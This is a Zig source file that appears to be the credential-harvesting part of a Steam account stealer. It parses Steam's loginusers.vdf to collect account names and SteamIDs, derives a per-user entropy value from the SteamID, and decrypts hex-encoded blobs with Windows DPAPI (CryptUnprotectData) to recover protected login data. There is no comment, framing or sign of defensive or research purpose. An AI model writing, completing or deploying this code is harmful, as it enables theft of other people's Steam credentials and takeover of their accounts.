const std = @import("std");
const win = std.os.windows;

const Blob = extern struct { cbData: win.DWORD, pbData: [*]u8 };
extern "crypt32" fn CryptUnprotectData(*const Blob, ?*win.LPWSTR, *const Blob, ?*anyopaque, ?*anyopaque, win.DWORD, *Blob) callconv(.winapi) win.INT;
extern "kernel32" fn LocalFree(win.HLOCAL) callconv(.winapi) ?win.HANDLE;

pub const Entry = struct { name: []const u8, login: []const u8, salt: []const u8 };

pub fn getSalts(allocator: std.mem.Allocator) !std.ArrayListUnmanaged(Entry) {
    var entries = std.ArrayListUnmanaged(Entry){};
    const file = std.fs.openFileAbsolute("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", .{}) catch return entries;
    defer file.close();
    const content = try file.readToEndAlloc(allocator, 1024 * 1024);
    defer allocator.free(content);

    var it = std.mem.tokenizeAny(u8, content, "\r\n\t ");
    var sid: ?[]const u8 = null;
    var name: ?[]const u8 = null;
    var login: ?[]const u8 = null;

    while (it.next()) |t| {
        const c = std.mem.trim(u8, t, "\"");
        if (c.len == 17 and std.ascii.isDigit(c[0])) sid = c;
        if (std.mem.eql(u8, c, "AccountName")) name = std.mem.trim(u8, it.next() orelse "", "\"");
        if (std.mem.eql(u8, c, "PersonaName")) login = std.mem.trim(u8, it.next() orelse "", "\"");

        if (sid != null and name != null and login != null) {
            try entries.append(allocator, .{
                .name = try allocator.dupe(u8, name.?),
                .login = try allocator.dupe(u8, login.?),
                .salt = try std.fmt.allocPrint(allocator, "user_{s}", .{sid.?[sid.?.len - 6 ..]}),
            });
            sid = null; name = null; login = null;
        }
    }
    return entries;
}

pub fn decrypt(alloc: std.mem.Allocator, hex: []const u8, salt: []const u8) ![]u8 {
    const len = hex.len / 2;
    const bin = try alloc.alloc(u8, len);
    defer alloc.free(bin);

    for (0..len) |i| bin[i] = std.fmt.parseInt(u8, hex[i * 2 .. i * 2 + 2], 16) catch return error.DecryptionFailed;

    var out: Blob = undefined;
    const in = Blob{ .cbData = @intCast(len), .pbData = bin.ptr };
    const ent = Blob{ .cbData = @intCast(salt.len), .pbData = @constCast(salt.ptr) };

    if (CryptUnprotectData(&in, null, &ent, null, null, 0, &out) == 0) return error.DecryptionFailed;
    defer _ = LocalFree(out.pbData);

    return alloc.dupe(u8, out.pbData[0..out.cbData]);
}